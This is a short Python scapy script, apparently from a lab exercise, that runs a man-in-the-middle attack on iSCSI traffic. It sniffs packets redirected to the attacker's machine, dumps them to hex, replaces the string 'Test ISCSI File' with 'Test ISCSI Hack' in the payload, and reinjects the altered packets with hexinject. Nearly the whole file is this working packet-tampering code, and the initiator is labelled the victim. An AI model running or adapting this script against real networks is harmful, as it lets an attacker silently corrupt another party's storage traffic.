#!/etc/usr/python

from scapy.all import *
import sys

iface = "eth0"
filter = "tcp"
#victim in this case is the initiator
VICTIM_IP = "192.168.1.167"
MY_IP = "192.168.1.170"
# gateway is the target
GATEWAY_IP = "192.168.1.168"
#VICTIM_MAC = "### don't want so show###"
MY_MAC = "08:00:27:f2:ee:7c"
#target mac address
GATEWAY_MAC = "08:00:27:60:74:b2"

def handle_packet(packet):
    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
     	# we change the packet destination to the target machine
     	packet[Ether].dst = GATEWAY_MAC
        if(packet[TCP]):
           	# shows what the packet contains
        	packet.show()
		# lines below are to redirect hexdump to a file so that we can use in the python script again
		stdout = sys.stdout
		sys.stdout = open('packet.txt', 'w')
		hexdump(packet)
		packet_str = open('packet.txt')
		packet_hex = ''
		#trimming the hexadecimal packet to get only the hexadecimal content
		for line in packet_str:
			hexline = line.split('   ')[1]
			hexline = hexline.replace('  ', ' ')
			packet_hex = packet_hex + hexline
		if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet_hex):
			packet_hex = packet_hex.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B")
			#packet_file = open('packet', 'w')
			#packet_file.write(packet_read)
			os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
		else:
			os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
		# corrects the std output to the console again
		sys.stdout.close()
		sys.stdout = stdout
    	# TODO: create condition to check/filter the 'dport' packet tcp argument for 'iscsi_target'
    	#os.system("echo '"  + packet_str + "' | hexinject -p -i eth0")
    	print "A packet from " + packet[IP].src + " redirected!"

sniff(prn=handle_packet, filter=filter, iface=iface, count=0, store=1)
